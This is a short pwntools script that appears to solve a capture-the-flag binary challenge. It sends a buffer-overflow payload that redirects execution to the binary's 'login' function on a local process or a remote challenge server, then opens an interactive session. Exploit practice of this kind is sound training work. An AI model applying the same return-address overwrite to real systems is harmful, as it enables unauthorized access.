#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=2)
context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./bin")

if args.GDB:
    p = gdb.debug(
        "./bin",
        """
    source /home/user/.gdbinit-gef.py
    break *(main+89)
    continue
    """,
    )
elif args.LOCAL:
    p = process("./bin")
else:
    p = remote("cytech.tcdn.casa", 4302)

payload = flat(
    {
        "uaaa": exe.sym["login"],
    }
)
log.hexdump(payload)
p.sendline(payload)

p.interactive()
